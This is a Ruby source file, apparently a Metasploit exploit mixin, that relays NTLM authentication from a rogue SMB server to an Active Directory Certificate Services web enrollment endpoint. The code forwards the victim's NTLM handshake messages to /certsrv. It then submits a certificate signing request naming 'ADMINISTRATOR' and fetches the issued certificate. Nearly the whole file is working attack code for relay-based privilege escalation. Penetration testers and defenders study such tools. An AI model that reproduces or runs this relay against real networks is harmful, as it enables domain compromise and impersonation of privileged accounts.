###
#
# This mixin provides support for reporting captured SMB creds
#
###

module Msf::Exploit::Remote::SMB::Server::HttpRelay

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::NTLM::Client
  include Msf::Exploit::Remote::SMB::Server::HashCapture

  def print_ntlm_type1(ntlm_message)
    print_status("Sign: #{ntlm_message.sign.encoding}")
    print_status("Sign: #{bin_to_hex(ntlm_message.sign)}")

    print_status("Domain: #{ntlm_message.domain.encoding}")
    print_status("Domain: #{bin_to_hex(ntlm_message.domain)}")

    print_status("Workstation: #{ntlm_message.workstation.encoding}")
    print_status("Workstation: #{bin_to_hex(ntlm_message.workstation)}")

  end

  def create_csr(private_key, alt_usr)
    print_status("Generating CSR...")
    request = OpenSSL::X509::Request.new
    request.version = 1
    request.subject = OpenSSL::X509::Name.new([
                                                ['CN', alt_usr, OpenSSL::ASN1::UTF8STRING]
                                              ])
    request.public_key = private_key.public_key
    request.sign(private_key, OpenSSL::Digest.new('SHA256'))
    print_status("CSR Generated")
    request
  end

  def http_client
    begin
      if (@http_client.nil?)
        @http_client = Rex::Proto::Http::Client.new(datastore['RHOST'],
                                                     datastore['RPORT'],
                                                     {},
                                                     datastore['SSL'],
                                                     datastore['ssl_version'],
                                                     proxies,
                                                     datastore['username'],
                                                     datastore['password'])
        @http_client.connect
      end
      return @http_client
    rescue Exception => e
      print_error(e.to_s)
    end
  end

  def relay_ntlm_type1(ntlm_type1)
    print_status("Relaying NTLM Type 1")

    begin
      ntlm_type1.domain.force_encoding('ASCII-8BIT')
      ntlm_type1.workstation.force_encoding('ASCII-8BIT')

      print_status("Sending NTLM Handshake to HTTP Relay Target")
      req = http_client.request_raw(
        {
          'method'  => 'GET',
          'uri'     => '/certsrv/csertfnsh.asp',
          'headers' => {
                          'Accept-Encoding' => 'identity'
                       }
        })
      res = http_client._send_recv(req, 20, true)
      if res.code != 401
        print_error("Server returned #{res.code.to_s}")
        return nil
      else
        print_status("HTTP Target Available for Negotiation")
      end

      print_status("Relaying NTLM Message 1 to HTTP Target")
      req = http_client.request_raw(
        {
          'method'  => 'GET',
          'uri'     => '/certsrv/csertfnsh.asp',
          'headers' => {
            'Accept-Encoding' => 'identity',
            'Authorization' => 'NTLM ' + ntlm_type1.encode64 }
        })
      res = http_client._send_recv(req, 20, true)
      ntlm_type2_b64 = res.headers['WWW-Authenticate'].split()[1]
      ntlm_type2 = Net::NTLM::Message.decode64(ntlm_type2_b64)

      # print_status("HTTP Client: #{http_client_socket}")
    rescue Exception => e
      print_error(e.to_s)
    end
    print_status("Received NTLM Type 2 from HTTP Relay Target")
    print_status("Returning NTLM Type 2 to SMB Client")
    return ntlm_type2
  end

  def relay_ntlm_type3(ntlm_type3)
    #    print_status("HTTP Client: #{http_client_socket}")
    print_status("Recieved NTLM Type 3 from SMB Client")

    begin
      ntlm_type3.domain = ntlm_type3.domain.force_encoding('ASCII-8BIT')
      ntlm_type3.user = ntlm_type3.user.force_encoding('ASCII-8BIT')
      ntlm_type3.workstation = ntlm_type3.workstation.force_encoding('ASCII-8BIT')
      decode_message = Base64.decode64(ntlm_type3.encode64)

    rescue Exception => e
      print_error(e.to_s)
    end

    print_status("Relaying NTLM Type 3 to HTTP Target")
    req = http_client.request_raw(
      {
        'method'  => 'GET',
        'uri'     => '/certsrv/csertfnsh.asp',
        'headers' => {
          'Accept-Encoding' => 'identity',
          'Authorization' => 'NTLM ' + ntlm_type3.encode64 }
      })
    res = http_client._send_recv(req, 20, true)

    print_status("HTTP NTLM Login Successful...")
    print_status("Sending Post to generate Certificate")
    begin
      private_key = OpenSSL::PKey::RSA.new(4096)
      request = create_csr(private_key, 'ADMINISTRATOR')
      req = http_client.request_cgi(
        {
          'method'  => 'POST',
          'uri'     => '/certsrv/certfnsh.asp',
          'ctype'  => 'application/x-www-form-urlencoded',
          'vars_post' => {
            'Mode' => 'newreq',
            'CertRequest' => request.to_s,
            'CertAttrib' => 'CertificateTemplate:User',
            'TargetStoreFlags' => 0,
            'SaveCert' => 'yes',
            'ThumbPrint' => ''
          }
        })
      res = http_client._send_recv(req, 20, true)
      print_status("Post Sent")
    rescue Exception => e
      print_error(e.to_s)
    end

    print_status("Waiting 5 seconds for certificate to generate")
    sleep(5)
    print_status("Certificate Request Granted") if res&.code == 200

    begin
      location_tag = res.body.match(/^.*location=\"(.*)\"/)[1]
    rescue Exception => e
      print_error(e.to_s)
    end
    begin
      print_status("Certificate location tag = #{location_tag}")
      location_uri = "/certsrv/#{location_tag}"
      print_status("Requesting Certificate from Relay Target...")
      req = http_client.request_cgi(
        {
          'method'  => 'GET',
          'uri'     => location_uri
        })
      res = http_client._send_recv(req, 20, true)
      print_status(res.body)
    rescue Exception => e
      print_error(e.to_s)
    end
  end

  class HTTPRelayNTLMProvider < ::RubySMB::Gss::Provider::NTLM
    # @param [::WindowsError::NTStatus] ntlm_type3_status A specific NT Status to return as the response to the NTLM
    #   type 3 message. If this value is nil, the message will be processed as normal.
    def initialize(allow_anonymous: false, allow_guests: false, default_domain: 'WORKGROUP', listener: nil, ntlm_type3_status: ::WindowsError::NTStatus::STATUS_ACCESS_DENIED)
      super(allow_anonymous: allow_anonymous, allow_guests: allow_guests, default_domain: default_domain)
      @listener = listener
      @ntlm_type3_status = ntlm_type3_status
      @http_client = nil
    end

    # Needs overwritten to ensure our version of Authenticator is returned
    def new_authenticator(server_client)
      # build and return an instance that can process and track stateful information for a particular connection but
      # that's backed by this particular provider
      HTTPRelayAuthenticator.new(self, server_client)
    end

    attr_reader :listener
    attr_accessor :ntlm_type3_status
  end

  class HTTPRelayAuthenticator < ::RubySMB::Gss::Provider::NTLM::Authenticator

    def process_ntlm_type1(type1_msg)
      @ntlm_type1 = type1_msg
      @ntlm_type2 = @provider.listener.relay_ntlm_type1(type1_msg)
      @ntlm_type2
    end

    def process_ntlm_type3(type3_msg)
      @provider.listener.relay_ntlm_type3(type3_msg)
    end


  end
end
